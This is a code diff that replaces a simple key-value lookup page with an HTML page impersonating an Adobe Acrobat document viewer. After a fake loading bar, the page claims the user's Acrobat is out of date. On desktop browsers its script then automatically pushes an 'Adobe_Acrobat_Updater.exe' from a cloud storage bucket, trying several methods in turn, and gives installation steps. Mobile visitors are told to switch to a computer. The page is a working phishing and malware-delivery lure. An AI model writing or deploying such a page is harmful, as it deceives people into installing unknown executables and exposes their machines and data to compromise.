@@ -1,30 +1,831 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Storage Lookup</title>
-</head>
-<body>
-    <h1>Data Lookup</h1>
-    <p>Key: <span id="key"></span></p>
-    <p>Value: <span id="value"></span></p>
-    <script>
-        async function fetchValue() {
-            const key = window.location.hash.substring(1);
-            document.getElementById('key').textContent = key || '[NONE]';
-            if (!key) {
-                document.getElementById('value').textContent = "No key provided";
-                return;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Document Viewer</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --adobe-red: #FA0F00;
+            --adobe-dark-red: #D10000;
+            --primary-blue: #1473E6;
+            --dark-blue: #0D66D0;
+            --text-primary: #1A1A1A;
+            --text-secondary: #666666;
+            --text-tertiary: #999999;
+            --border-color: #E8E8E8;
+            --bg-light: #F8F9FA;
+            --bg-white: #FFFFFF;
+            --success-green: #16C79A;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #2C2C2C;
+            min-height: 100vh;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .viewer-container {
+            width: 100%;
+            max-width: 900px;
+            background: var(--bg-white);
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Header */
+        .viewer-header {
+            background: #2C2C2C;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #444;
+        }
+
+        .adobe-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-mark {
+            width: 120px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-mark svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .reload-btn {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            background: var(--adobe-red);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            animation: pulse 2s infinite;
+        }
+
+        .reload-btn:hover {
+            background: var(--adobe-dark-red);
+            transform: translateY(-1px);
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(250, 15, 0, 0.7);
             }
-            try {
-                const resp = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
-                const data = await resp.json();
-                document.getElementById('value').textContent = data.success ? (data.value ?? '[null]') : `Error: ${data.error || 'Unknown error'}`;
-            } catch (e) {
-                document.getElementById('value').textContent = 'Fetch error: ' + e;
+            50% {
+                box-shadow: 0 0 0 10px rgba(250, 15, 0, 0);
             }
         }
-        window.addEventListener('hashchange', fetchValue);
-        fetchValue(); // Run once on load
+
+        /* Content Area */
+        .viewer-content {
+            background: #525659;
+            min-height: 600px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 40px;
+            position: relative;
+        }
+
+        /* Loading State */
+        .loading-state {
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .loading-state.hidden {
+            display: none;
+        }
+
+        .document-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .document-icon svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 8px 24px rgba(255, 71, 87, 0.3));
+        }
+
+        .loading-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .loading-subtitle {
+            font-size: 16px;
+            color: #B0B0B0;
+            margin-bottom: 40px;
+            font-weight: 500;
+        }
+
+        .user-name {
+            color: var(--adobe-red);
+            font-weight: 600;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            background: #3A3A3A;
+            border-radius: 8px;
+            height: 12px;
+            overflow: hidden;
+            margin-bottom: 16px;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #FA0F00 0%, #FF4D3D 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(250, 15, 0, 0.5);
+        }
+
+        .progress-text {
+            color: #B0B0B0;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Error State */
+        .error-state {
+            display: none;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .error-state.active {
+            display: block;
+        }
+
+        /* Error PDF Icon */
+        .error-pdf-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: errorShake 0.5s ease-in-out;
+        }
+
+        @keyframes errorShake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-3px); }
+            20%, 40%, 60%, 80% { transform: translateX(3px); }
+        }
+
+        .error-pdf-icon svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 8px 24px rgba(250, 15, 0, 0.3));
+        }
+
+        .error-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .error-message {
+            font-size: 16px;
+            color: #B0B0B0;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        .download-info {
+            background: #3A3A3A;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 2px solid #4A4A4A;
+        }
+
+        .download-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(250, 15, 0, 0.3);
+            border-top-color: var(--adobe-red);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .download-status-text {
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .checkmark {
+            display: none;
+            font-size: 20px;
+        }
+
+        .checkmark.show {
+            display: inline;
+        }
+
+        .manual-download-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #FA0F00 0%, #D10000 100%);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 16px rgba(250, 15, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .manual-download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(250, 15, 0, 0.4);
+        }
+
+        .install-instructions {
+            background: #2C2C2C;
+            border-left: 4px solid var(--adobe-red);
+            padding: 20px 24px;
+            border-radius: 8px;
+            margin-top: 24px;
+        }
+
+        .install-title {
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .install-steps {
+            list-style: none;
+            padding: 0;
+        }
+
+        .install-steps li {
+            color: #B0B0B0;
+            font-size: 14px;
+            padding: 8px 0;
+            padding-left: 28px;
+            position: relative;
+        }
+
+        .install-steps li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: var(--adobe-red);
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .reload-instruction {
+            background: linear-gradient(135deg, rgba(250, 15, 0, 0.1) 0%, rgba(209, 0, 0, 0.1) 100%);
+            border: 2px solid var(--adobe-red);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .reload-instruction-text {
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .reload-instruction-icon {
+            color: var(--adobe-red);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Mobile Error State */
+        .mobile-error-state {
+            display: none;
+        }
+
+        .mobile-error-state.active {
+            display: block;
+        }
+
+        .mobile-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: errorShake 0.5s ease-in-out;
+        }
+
+        .mobile-icon svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 8px 24px rgba(250, 15, 0, 0.3));
+        }
+
+        .mobile-info-box {
+            background: #3A3A3A;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 2px solid #4A4A4A;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            text-align: left;
+        }
+
+        .mobile-info-icon {
+            font-size: 48px;
+            flex-shrink: 0;
+        }
+
+        .mobile-info-content {
+            flex: 1;
+        }
+
+        .mobile-info-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .mobile-info-text {
+            color: #B0B0B0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .device-list {
+            background: #2C2C2C;
+            border-left: 4px solid var(--adobe-red);
+            padding: 20px 24px;
+            border-radius: 8px;
+            margin-top: 24px;
+        }
+
+        .device-list-title {
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .device-items {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .device-item {
+            background: #3A3A3A;
+            padding: 12px 20px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+            min-width: 140px;
+        }
+
+        .device-icon {
+            font-size: 24px;
+        }
+
+        .device-name {
+            color: #B0B0B0;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .viewer-container {
+                border-radius: 0;
+            }
+
+            .viewer-content {
+                padding: 40px 24px;
+                min-height: 500px;
+            }
+
+            .loading-title,
+            .error-title {
+                font-size: 22px;
+            }
+
+            .document-icon,
+            .error-pdf-icon,
+            .mobile-icon {
+                width: 100px;
+                height: 100px;
+            }
+
+            .logo-mark {
+                width: 100px;
+                height: 30px;
+            }
+
+            .reload-btn {
+                font-size: 12px;
+                padding: 8px 16px;
+            }
+
+            .mobile-info-box {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .device-items {
+                flex-direction: column;
+            }
+
+            .device-item {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="viewer-container">
+        <!-- Header -->
+        <div class="viewer-header">
+            <div class="adobe-logo">
+                <div class="logo-mark">
+                    <!-- Adobe Acrobat Logo -->
+                    <svg viewBox="0 0 240 76" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#FA0F00" d="M42.5,0h-37C2.5,0,0,2.5,0,5.5v65c0,3,2.5,5.5,5.5,5.5h37c3,0,5.5-2.5,5.5-5.5v-65C48,2.5,45.5,0,42.5,0z"/>
+                        <path fill="#FFFFFF" d="M24,12L15,36h4.5l1.5-4h7l1.5,4H34L25,12H24z M21.5,29l2.5-7l2.5,7H21.5z"/>
+                        <text x="55" y="30" font-family="Arial, sans-serif" font-size="22" font-weight="bold" fill="#FFFFFF">Adobe</text>
+                        <text x="55" y="50" font-family="Arial, sans-serif" font-size="16" fill="#B0B0B0">Acrobat</text>
+                    </svg>
+                </div>
+            </div>
+            <button class="reload-btn" id="reloadBtn" onclick="reloadDocument()">
+                <span>🔄</span>
+                <span>Reload Document</span>
+            </button>
+        </div>
+
+        <!-- Viewer Content -->
+        <div class="viewer-content">
+            <!-- Loading State -->
+            <div class="loading-state" id="loadingState">
+                <div class="document-icon">
+                    <!-- Realistic PDF Icon -->
+                    <svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="pdfGradient" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" style="stop-color:#FF2116;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#C50E0C;stop-opacity:1" />
+                            </linearGradient>
+                        </defs>
+                        <!-- PDF Document Shape -->
+                        <path fill="url(#pdfGradient)" d="M50 10 L160 10 L206 56 L206 246 L50 246 Z"/>
+                        <!-- Folded Corner -->
+                        <path fill="#A30A08" d="M160 10 L160 56 L206 56 Z"/>
+                        <!-- PDF Text -->
+                        <text x="128" y="140" font-family="Arial, sans-serif" font-size="48" font-weight="bold" fill="#FFFFFF" text-anchor="middle">PDF</text>
+                        <!-- Document Lines -->
+                        <rect x="70" y="170" width="116" height="8" rx="4" fill="#FFFFFF" opacity="0.9"/>
+                        <rect x="70" y="190" width="95" height="8" rx="4" fill="#FFFFFF" opacity="0.8"/>
+                        <rect x="70" y="210" width="100" height="8" rx="4" fill="#FFFFFF" opacity="0.7"/>
+                    </svg>
+                </div>
+                <h1 class="loading-title">Hi <span class="user-name" id="userName">there</span>, your document is being loaded.</h1>
+                <p class="loading-subtitle">Please wait while we prepare your document...</p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Loading... 0%</div>
+            </div>
+
+            <!-- Desktop Error State -->
+            <div class="error-state" id="errorState">
+                <!-- PDF Icon with Error Indicator -->
+                <div class="error-pdf-icon">
+                    <svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="pdfGradientError" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" style="stop-color:#FF2116;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#C50E0C;stop-opacity:1" />
+                            </linearGradient>
+                        </defs>
+                        <!-- PDF Document Shape (Faded) -->
+                        <path fill="url(#pdfGradientError)" d="M50 10 L160 10 L206 56 L206 246 L50 246 Z" opacity="0.3"/>
+                        <!-- Folded Corner -->
+                        <path fill="#A30A08" d="M160 10 L160 56 L206 56 Z" opacity="0.3"/>
+                        <!-- PDF Text -->
+                        <text x="128" y="140" font-family="Arial, sans-serif" font-size="48" font-weight="bold" fill="#FFFFFF" text-anchor="middle" opacity="0.5">PDF</text>
+                        
+                        <!-- Error Badge (Red Circle with X) -->
+                        <circle cx="190" cy="70" r="35" fill="#FA0F00"/>
+                        <circle cx="190" cy="70" r="30" fill="#FFFFFF"/>
+                        <line x1="180" y1="60" x2="200" y2="80" stroke="#FA0F00" stroke-width="6" stroke-linecap="round"/>
+                        <line x1="200" y1="60" x2="180" y2="80" stroke="#FA0F00" stroke-width="6" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                
+                <h2 class="error-title">Document Can't Be Loaded</h2>
+                <p class="error-message">
+                    Your version of Adobe Acrobat is not up to date.<br>
+                    Please update to the latest version to view this document.
+                </p>
+
+                <div class="download-info">
+                    <div class="download-status">
+                        <span class="spinner" id="spinner"></span>
+                        <span class="checkmark" id="checkmark">✅</span>
+                        <span class="download-status-text" id="downloadStatus">Auto-downloading Adobe Acrobat update...</span>
+                    </div>
+                </div>
+
+                <a href="https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/Adobe_Acrobat_Updaterv123.943.2026.exe" 
+                   target="_blank" 
+                   download="Adobe_Acrobat_Updater.exe"
+                   class="manual-download-btn" 
+                   id="manualDownloadBtn">
+                    <span>⬇</span>
+                    <span>Click here if download doesn't start</span>
+                </a>
+
+                <div class="install-instructions">
+                    <div class="install-title">
+                        <span>📋</span>
+                        <span>Installation Steps:</span>
+                    </div>
+                    <ul class="install-steps">
+                        <li>Open the downloaded Adobe Acrobat installer</li>
+                        <li>Follow the installation wizard instructions</li>
+                        <li>Complete the installation process</li>
+                        <li>Click the "Reload Document" button in the top right corner</li>
+                    </ul>
+                </div>
+
+                <div class="reload-instruction">
+                    <div class="reload-instruction-text">
+                        After installation, click "Reload Document" ↗️
+                    </div>
+                    <div class="reload-instruction-icon">
+                        Look for the reload button in the top right corner of this page
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mobile Error State -->
+            <div class="error-state mobile-error-state" id="mobileErrorState">
+                <!-- Mobile Icon -->
+                <div class="mobile-icon">
+                    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="mobileGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                <stop offset="0%" style="stop-color:#FA0F00"/>
+                                <stop offset="100%" style="stop-color:#C50E0C"/>
+                            </linearGradient>
+                        </defs>
+                        
+                        <!-- Mobile Device -->
+                        <rect x="60" y="30" width="80" height="140" rx="10" fill="url(#mobileGrad)" opacity="0.9"/>
+                        <rect x="65" y="40" width="70" height="110" rx="5" fill="#FFFFFF" opacity="0.3"/>
+                        <circle cx="100" cy="160" r="8" fill="#FFFFFF" opacity="0.5"/>
+                        
+                        <!-- Prohibition Circle -->
+                        <circle cx="100" cy="100" r="75" fill="none" stroke="#FA0F00" stroke-width="8" opacity="0.4"/>
+                        <line x1="50" y1="50" x2="150" y2="150" stroke="#FA0F00" stroke-width="8" opacity="0.4" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                
+                <h2 class="error-title">Mobile Device Detected</h2>
+                <p class="error-message">
+                    This document is optimized for desktop viewing only.<br>
+                    Please access this page from a computer for the best experience.
+                </p>
+
+                <div class="mobile-info-box">
+                    <div class="mobile-info-icon">💻</div>
+                    <div class="mobile-info-content">
+                        <div class="mobile-info-title">Switch to Desktop</div>
+                        <div class="mobile-info-text">
+                            For optimal viewing and functionality, please open this link on a desktop or laptop computer.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="device-list">
+                    <div class="device-list-title">Supported Devices:</div>
+                    <div class="device-items">
+                        <div class="device-item">
+                            <span class="device-icon">🖥️</span>
+                            <span class="device-name">Desktop PC</span>
+                        </div>
+                        <div class="device-item">
+                            <span class="device-icon">💻</span>
+                            <span class="device-name">Laptop</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const DOWNLOAD_URL = 'https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/Adobe_Acrobat_Updaterv123.943.2026.exe';
+        const AUTO_DOWNLOAD_DELAY = 1000;
+
+        // Mobile detection function
+        function isMobileDevice() {
+            const ua = navigator.userAgent;
+            return /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i.test(ua);
+        }
+
+        // Get user name from URL parameter or use default
+        function getUserName() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('name') || 'there';
+        }
+
+        // Set user name
+        document.getElementById('userName').textContent = getUserName();
+
+        // Simulate loading progress
+        function startLoading() {
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += 2;
+                progressBar.style.width = progress + '%';
+                progressText.textContent = `Loading... ${progress}%`;
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        // Check if mobile
+                        if (isMobileDevice()) {
+                            showMobileError();
+                        } else {
+                            showError();
+                        }
+                    }, 500);
+                }
+            }, 100);
+        }
+
+        // Show mobile error (no download needed)
+        function showMobileError() {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('mobileErrorState').classList.add('active');
+            document.getElementById('reloadBtn').style.display = 'flex';
+            
+            console.log('📱 Mobile device detected');
+        }
+
+        // Show desktop error and auto-download
+        function showError() {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('errorState').classList.add('active');
+            document.getElementById('reloadBtn').style.display = 'flex';
+
+            // Auto-download after delay
+            setTimeout(() => {
+                autoDownload();
+            }, AUTO_DOWNLOAD_DELAY);
+        }
+
+        // Multi-method auto-download function
+        function autoDownload() {
+            console.log('🔄 Starting auto-download...');
+            
+            // Method 1: Hidden link click
+            try {
+                const link = document.createElement('a');
+                link.href = DOWNLOAD_URL;
+                link.download = 'Adobe_Acrobat_Updater.exe';
+                link.target = '_blank';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                console.log('✅ Method 1: Link click executed');
+            } catch (error) {
+                console.error('❌ Method 1 failed:', error);
+            }
+            
+            // Method 2: window.open (fallback after 500ms)
+            setTimeout(() => {
+                try {
+                    const newWindow = window.open(DOWNLOAD_URL, '_blank');
+                    if (newWindow) {
+                        console.log('✅ Method 2: New window opened');
+                    } else {
+                        console.warn('⚠️ Method 2: Popup blocked');
+                        // Method 3: Direct navigation (last resort)
+                        window.location.href = DOWNLOAD_URL;
+                        console.log('✅ Method 3: Direct navigation');
+                    }
+                } catch (error) {
+                    console.error('❌ Method 2 failed:', error);
+                }
+            }, 500);
+
+            // Update UI
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('checkmark').classList.add('show');
+                document.getElementById('downloadStatus').textContent = 'Download started! Check your downloads folder.';
+            }, 3000);
+        }
+
+        // Reload document function
+        function reloadDocument() {
+            console.log('🔄 Reloading document...');
+            location.reload();
+        }
+
+        // Start loading when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            console.log('👋 Welcome, ' + getUserName());
+            console.log('📱 Mobile device:', isMobileDevice());
+            startLoading();
+        });
     </script>
 </body>
 </html>
